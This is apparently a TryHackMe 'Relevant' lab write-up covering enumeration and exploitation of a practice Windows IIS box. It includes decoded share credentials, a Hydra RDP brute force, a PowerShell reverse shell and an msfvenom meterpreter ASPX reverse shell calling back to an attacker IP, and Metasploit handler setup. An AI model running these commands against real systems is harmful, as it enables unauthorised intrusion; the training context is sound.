# TryHackMe - Relevant  
🔗 https://tryhackme.com/room/relevant  
🎯 Objective: Enumerate services, extract encoded credentials from SMB, gain access via remote execution (ASPX shell), and escalate privileges.

---

## 🖥️ Target Information

| Property     | Value                                         |
|--------------|-----------------------------------------------|
| IP Address   | 10.10.196.72                                  |
| OS           | Windows Server 2008 R2 - 2012 (IIS 10.0)      |
| Services     | HTTP (80), SMB (139/445), RDP (3389), RPC (135) |

---

## 🔍 1. Enumeration

### 🔧 Nmap
```bash
nmap -sV -O 10.10.196.72
```

### 🔧 Gobuster
```bash
gobuster dir -u http://10.10.196.72 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http
```

No useful directories found via HTTP.

---

## 📁 2. SMB Enumeration

### List shares
```bash
smbclient -L //10.10.196.72 -N
```

Found:
- `nt4wrksv` (Disk)

### Connect to share
```bash
smbclient //10.10.196.72/nt4wrksv -N
```

### Discovered inside:
- `passwords.txt` (Base64 encoded)
```text
Qm9iIC0gIVBAJCRXMHJEITEyMw==  → Bob - !P@$$W0rD!123
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk  → Bill - Juw4nnaM4n420696969!$$$
```

---

## 🔑 3. Credential Testing

### Try SMB login with user
```bash
smbclient //10.10.196.72/nt4wrksv -U 'Bob'
```

Bob: failed  
Bill: expired  

---

## 💻 4. RDP Access Attempts
```bash
xfreerdp /u:Bob /p:'!P@$$W0rD!123' /v:10.10.196.72
xfreerdp /u:Bill /p:'Juw4nnaM4n420696969!$$$' /v:10.10.196.72
```

Both failed. Bill's password is expired. Brute-force next.

---

## 🔐 5. RDP Brute Force (Hydra)
```bash
hydra -l Bob -P /usr/share/wordlists/rockyou.txt rdp://10.10.196.72
```

---

## ⚡ 6. Remote Execution via SMB & ASPX

### SMB writeable by anonymous/Dick

Create PowerShell reverse shell payload (did not work):
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.65.89",12345); ...
```

### Final payload (ASPX reverse shell)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.65.89 LPORT=12345 -f aspx -o shell.aspx
```

Upload to SMB share:
```bash
smbclient //10.10.196.72/nt4wrksv -U anonymous
put shell.aspx
```

---

## 🧪 7. Start Listener in Metasploit

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.10.65.89
set LPORT 12345
run
```

Execute payload via HTTP:
```bash
http://10.10.196.72/nt4wrksv/shell.aspx
```

---

## 🐚 8. Post-Exploitation: Meterpreter

```bash
shell
whoami /all
```

User: `iis apppool\defaultapppool`

Group includes:
- BUILTIN\IIS_IUSRS
- NT AUTHORITY\SERVICE
- Mandatory Label\High

```bash
dir C:\Users
```

Users:
- Bob
- Administrator

---

## ✅ Summary

| Phase                  | Status                           |
|------------------------|----------------------------------|
| Enumeration             | ✅ nmap + gobuster               |
| SMB Investigation       | ✅ found passwords.txt           |
| RDP / SMB Access        | ⛔ RDP failed, SMB write found   |
| Initial Foothold        | ✅ ASPX reverse shell executed   |
| Meterpreter Shell       | ✅ IIS AppPool shell gained      |

🔜 Next Step:
- Local privilege escalation
- Explore C:\Users\Bob or Administrator
- Dump credentials or escalate to SYSTEM

